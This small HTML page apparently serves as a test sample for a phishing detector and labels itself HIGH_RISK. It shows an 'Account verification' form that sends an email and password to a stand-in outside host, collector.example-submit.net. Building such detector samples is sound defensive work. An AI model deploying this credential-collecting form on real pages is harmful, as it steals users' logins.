<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Demo Cross-Domain Login</title>
  <style>
    body {
      margin: 0;
      background: #07101f;
      color: #f8fbff;
      font-family: Arial, Helvetica, sans-serif;
    }

    main {
      max-width: 520px;
      margin: 0 auto;
      padding: 48px 20px;
    }

    form {
      display: grid;
      gap: 12px;
      border: 1px solid #70d6ff;
      border-radius: 8px;
      padding: 18px;
    }

    input,
    button {
      border-radius: 6px;
      border: 1px solid #244663;
      padding: 11px;
    }
  </style>
</head>
<body>
  <main>
    <p>Expected result: HIGH_RISK because a password login form posts to a different domain.</p>
    <h1>Account verification</h1>
    <form action="https://collector.example-submit.net/login" method="post">
      <label>Email <input name="email" autocomplete="username"></label>
      <label>Password <input type="password" name="password" autocomplete="current-password"></label>
      <button type="submit">Sign in and verify account</button>
    </form>
  </main>
</body>
</html>
